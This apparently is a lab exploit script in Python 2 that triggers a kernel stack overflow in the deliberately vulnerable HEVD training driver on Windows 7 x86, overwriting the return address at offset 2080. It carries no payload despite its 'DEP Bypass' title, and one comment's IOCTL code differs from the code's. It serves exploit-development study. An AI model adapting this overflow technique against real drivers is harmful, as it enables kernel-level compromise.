#!/etc/python
#Written by: Jb05s
#Purpose: HEVD - Stack Overflow with DEP Bypass (Windows 7 x86)

import ctypes, sys
from ctypes import *
 
kernel32 = windll.kernel32

"""
HANDLE CreateFileA(
  LPCSTR                lpFileName,	--> \\\\.\\HackSysExtremeVulnerableDriver
  DWORD                 dwDesiredAccess, --> 0xC0000000 (Generic_Read (0x80000000) + Generic_Write (0x40000000))
  DWORD                 dwShareMode, --> 0
  LPSECURITY_ATTRIBUTES lpSecurityAttributes, --> None
  DWORD                 dwCreationDisposition, --> 0x3 (Open_Existing)
  DWORD                 dwFlagsAndAttributes, --> 0
  HANDLE                hTemplateFile --> None
);
"""

vulnDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
if not vulnDevice or vulnDevice == -1:
    print "Unable to get driver handle."
    sys.exit(0)

"""
./pattern_create.rb -l 2304
./pattern_offset.rb -q 72433372 -l 2304
[*] Exact match at offset 2080
"""
   
pre = "A" * 2080
eip = "B" * 4
pad = "C" * (2304 - len(pre + eip))

buffer = pre + eip + pad
bufferLen = len(buffer)

"""
BOOL DeviceIoControl(
  HANDLE       hDevice, --> vulnDevice
  DWORD        dwIoControlCode, --> 0x22203 (HackSys_EVD_StackOverflow)
  LPVOID       lpInBuffer, --> A * 2304 (0x900 = 2304)
  DWORD        nInBufferSize, --> 0x800 (MOV ESI, 800h; PUSH ESI)
  LPVOID       lpOutBuffer, --> None
  DWORD        nOutBufferSize, --> 0
  LPDWORD      lpBytesReturned, --> byref(c_ulong())
  LPOVERLAPPED lpOverlapped --> None
);
"""

kernel32.DeviceIoControl(vulnDevice, 0x222003, buffer, bufferLen, None, 0, byref(c_ulong()), None)
